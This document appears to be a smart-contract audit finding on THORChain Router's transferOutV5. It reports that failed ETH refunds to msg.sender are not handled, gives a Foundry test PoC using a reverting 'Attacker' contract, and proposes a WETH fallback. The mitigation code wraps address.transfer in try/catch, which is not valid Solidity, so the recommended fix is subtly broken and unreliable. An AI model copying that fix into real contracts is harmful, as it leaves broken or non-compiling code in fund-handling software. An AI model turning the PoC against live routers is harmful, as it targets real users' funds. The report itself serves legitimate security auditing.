# Vulnerability details

## Impact
When Bifrost or any other actor calls the transferOutV5 function in RouterNoMsgSenderFallback, if the asset is the native currency (ETH in our case) and the transferOutPayload.to address cannot receive ETH, the function attempts to send ETH back to msg.sender:
```
   payable(address(msg.sender)).transfer(
                    transferOutPayload.amount
   );
```
However, there is no handling for the case where transferring to msg.sender fails. This behavior flaw exists in two places within the Router.

## Proof of Concept
```
// SPDX-License-Identifier: GPL-2.0
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";

import {THORChain_Router} from "../chain/ethereum/contracts/THORChain_Router.sol";

contract Attacker {
    receive() external payable {
        revert("jackpot");
    }
}

contract RouterNoMsgSenderFallback is Test {
    THORChain_Router public router;
    constructor() {
        router = new THORChain_Router();
    }

    function testTransferOutV5RevertToSendEthBackAToMsgSender() public {
        Attacker attacker = new Attacker();

        vm.deal(address(attacker), 1e18);
        vm.startPrank(address(attacker));
        vm.expectRevert("jackpot");

        THORChain_Router.TransferOutData
            memory transferOutPayload = THORChain_Router.TransferOutData({
                to: payable(address(this)),
                asset: address(0),
                amount: 1e18,
                memo: "0x"
            });

        router.transferOutV5{value: 1e18}(transferOutPayload);
        vm.stopPrank();
    }

    receive() external payable {
        revert("jackpot");
    }
}

```

## Recommended Mitigation Steps
Add WETH send fallback
```
address WETH = /* WETH Contract Address */;

try payable(address(msg.sender)).transfer(transferOutPayload.amount) {
    // Ether transfer was successful, no further action needed
} catch {
    // Ether transfer failed, proceed with WETH fallback
    IWETH(WETH).deposit{value: transferOutPayload.amount}();
    require(IWETH(WETH).transfer(msg.sender, transferOutPayload.amount), "WETH transfer failed");
}
```
